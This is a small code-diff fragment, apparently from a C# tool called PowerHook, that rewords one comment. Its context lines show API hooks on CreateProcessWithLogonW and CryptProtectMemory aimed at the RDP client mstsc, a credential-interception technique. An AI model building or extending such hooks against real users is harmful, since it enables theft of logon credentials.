@@ -123,7 +123,7 @@ namespace PowerHook
                 new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                 this);
 
-                // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, is better then this function)
+                // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, this is better then that function)
                 LoadLibrary("dpapi.dll");
                 var createCryptHook = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
